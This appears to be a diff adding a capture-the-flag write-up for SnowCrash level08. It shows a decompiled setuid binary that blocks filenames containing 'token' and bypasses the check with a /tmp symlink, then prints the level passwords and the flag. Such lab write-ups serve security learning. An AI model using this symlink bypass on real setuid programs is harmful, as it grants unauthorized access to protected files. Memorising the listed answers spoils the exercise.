@@ -1,0 +1,59 @@
+su level08
+pass : fiumuikeil55xe9cu4dood66h
+
+level08@SnowCrash:~$ ls -la
+total 28
+dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
+d--x--x--x  1 root    users    340 Aug 30  2015 ..
+-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
+-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
+-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
+-r-x------  1 level08 level08  675 Apr  3  2012 .profile
+-rw-------  1 flag08  flag08    26 Mar  5  2016 token
+
+level08@SnowCrash:~$ ./level08
+./level08 [file to read]
+level08@SnowCrash:~$ ./level08 token
+You may not access 'token'
+
+
+with DogBolt
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [esp+24h] [ebp-40Ch]
+  size_t v5; // [esp+28h] [ebp-408h]
+  char buf[1024]; // [esp+2Ch] [ebp-404h] BYREF
+  unsigned int v7; // [esp+42Ch] [ebp-4h]
+
+  v7 = __readgsdword(0x14u);
+  if ( argc == 1 )
+  {
+    printf("%s [file to read]\n", *argv);
+    exit(1);
+  }
+  if ( strstr(argv[1], "token") )
+  {
+    printf("You may not access '%s'\n", argv[1]);
+    exit(1);
+  }
+  v4 = open(argv[1], 0);
+  if ( v4 == -1 )
+    err(1, "Unable to open %s", argv[1]);
+  v5 = read(v4, buf, 0x400u);
+  if ( v5 == -1 )
+    err(1, "Unable to read fd %d", v4);
+  return write(1, buf, v5);
+}
+
+We have to read the file token but we have no right on it and it can't be named token 
+We create a symbolic link between the token file and a file without token in his name
+
+level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/plop3
+level08@SnowCrash:~$ ./level08 /tmp/plop3
+quif5eloekouj29ke0vouxean
+
+level08@SnowCrash:~$ su flag08
+Password: {quif5eloekouj29ke0vouxean}
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
